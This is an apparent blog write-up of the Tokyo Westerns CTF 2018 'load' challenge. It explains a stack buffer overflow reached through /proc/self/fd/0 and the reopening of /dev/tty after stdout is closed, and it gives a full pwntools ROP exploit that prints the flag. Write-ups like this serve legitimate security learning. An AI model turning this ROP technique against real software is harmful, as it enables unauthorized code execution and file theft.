+++
title = "Tokyo Westerns CTF 2018 - load"
date = "2024-07-10"
description = "Tokyo Westerns CTF 2018 pwnable challenge"

[taxonomies]
tags = ["ctf", "pwnable", "improper check", "bof", "file descriptor", "/dev/tty"]
+++

## 0x00. Introduction
``` bash
[*] '/home/user/load'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
    FORTIFY:  Enabled
```


## 0x01. Vulnerability
``` c
int __fastcall load_file_4008FD(void *buf, const char *file_name, __off_t offset, size_t size)
{
  int fd; // [rsp+2Ch] [rbp-4h]

  fd = open(file_name, 0);
  if ( fd == -1 )
    return puts("You can't read this file...");
  lseek(fd, offset, 0);
  if ( read(fd, buf, size) > 0 )
    puts("Load file complete!");
  return close(fd);
}
```

Looking at `load_file_4008FD()`, it opens the input file name, reads `size` bytes of content, and writes it to the `buf` variable in `main()`.

If we manipulate `file_name` to be `/proc/self/fd/0`, instead of reading file contents, it reads from `stdin` and writes to `buf`.

``` c
  char buf[32]; // [rsp+0h] [rbp-30h] BYREF
  size_t size; // [rsp+20h] [rbp-10h]
  __off_t offset; // [rsp+28h] [rbp-8h]
```

The `buf` in `main()` is located at `rbp-0x30` and we can input `size` as much as we want, so a BOF vulnerability occurs.


## 0x02. Exploit
Since there's a BOF vulnerability, I tried to do a libc leak, but strangely neither `puts()` nor `_printf_chk()` which have PLT entries produced any output.

So I debugged and confirmed that the return value of `puts()` was `-1`, indicating that some error had occurred.
While searching for when such errors occur, I found information that this can happen when there's a problem with `stdout`, then I found...

``` c
int close_4008D8()
{
  close(0);
  close(1);
  return close(2);
}
```

After `load_file_4008FD()` ends and before `main()` terminates, a function called `close_4008D8()` is called, which closes `stdout`.
So after diligent googling, I learned that we can revive `stdout` by opening `/dev/tty`.

The problem was where to place `/dev/tty` and pass it to `open()`.
During the process of putting `/proc/self/fd/0` in `file_name` to trigger the BOF vulnerability, I thought I could add a `\x00` and pass `/dev/tty`.

``` python
    # open("/dev/tty", O_RDWR | O_CREAT)
    payload_open = p64(ppr)
    payload_open += p64(66)                     # pop rsi
    payload_open += p64(0)                      # pop r15
    payload_open += p64(pr)
    payload_open += p64(bp['file_name'] + 0x10) # pop rdi
    payload_open += p64(elf.plt['open'])
```

I confirmed that putting the above payload 3 times in the ROP chain created 0, 1, and 2 in `/proc/self/fd/` in order.

Although I succeeded in leaking this way, even after reviving `stdin`, I failed to send the next payload.
So my concern was that even if I leaked, I couldn't provide the next input, so I needed to give input at once to `open` -> `read` -> `write` the flag all at once, but there's no `rdx` related gadget.

Which means I can't control `size`, the third argument of `read`, so after doing `open("flag", 'r');` I had to pray that the `rdx` value would be large enough to read the contents...
When I actually checked, the `rdx` value after `open` finished was 0.

I spent a long time thinking about how to output...

``` c
  load_file_4008FD(buf, byte_601040, offset, size);
```

Fortunately, there was a function in the code section that performs the same logic!

- `rdi`: Using `pop rdi; ret;` gadget, `byte_601040` which is a free space
- `rsi`: Using `pop rsi; pop r15; ret;` gadget, location of `flag` inserted when triggering BOF
- `rdx`: `0` after `open` finishes
- `rcx`: `0x7ffff7e9e53b` after `open` finishes (sufficiently large value)

By controlling the registers this way, I was able to output the `flag`.


## 0x03. Payload
``` python
from pwn import *
from pwnlib.util.packing import p32, p64, u32, u64
import sys

DEBUG = True
BINARY = "load"
LIBRARY = "libc.so.6"

pr = 0x0000000000400a73
ppr = 0x0000000000400a71
bp = {
    'read_of_load_file' : 0x400966,
    'main' : 0x400817,
    'end_of_main' : 0x4008A8,
    'close' : 0x4008D8,
    'read_str' : 0x400986,
    'file_name' : 0x601040,
    'load_file' : 0x4008FD,
}

gs = f'''
continue
'''
context.terminal = ['tmux', 'splitw', '-hf']

def send_msg(s, msg):
    print(s.recvuntil(b": "))
    s.sendline(msg.encode())

def main():
    if(len(sys.argv) > 1):
        s = process(BINARY)
    else:
        s = process(BINARY)
        if DEBUG:
            gdb.attach(s, gs)
    elf = ELF(BINARY)
    lib = ELF(LIBRARY)

    send_msg(s, "/proc/self/fd/0\x00/dev/tty\x00flag\x00")
    send_msg(s, "0")
    send_msg(s, "1024")

    payload = b"A" * 0x30
    payload += b"B" * 8

    # open("/dev/tty", O_RDWR | O_CREAT)
    payload_open = p64(ppr)
    payload_open += p64(66)                     # pop rsi
    payload_open += p64(0)                      # pop r15
    payload_open += p64(pr)
    payload_open += p64(bp['file_name'] + 0x10) # pop rdi
    payload_open += p64(elf.plt['open'])

    # open 3 times -> open 0, 1, 2
    payload += payload_open * 3

    # load_file_4008FD(byte_601040, "flag", offset, size)
    payload += p64(ppr)
    payload += p64(bp['file_name'] + 0x19)      # pop rsi
    payload += p64(0)                           # pop r15
    payload += p64(pr)
    payload += p64(bp['file_name'])             # pop rdi
    payload += p64(bp['load_file'])

    # puts(byte_601040)
    payload += p64(pr)
    payload += p64(bp['file_name'])             # pop rdi
    payload += p64(elf.plt['puts'])

    log.info(f"payload length : {hex(len(payload))}")
    s.sendline(payload)
    pause()
    print(s.recv().split(b"\n")[2])

if __name__=='__main__':
    main()
```
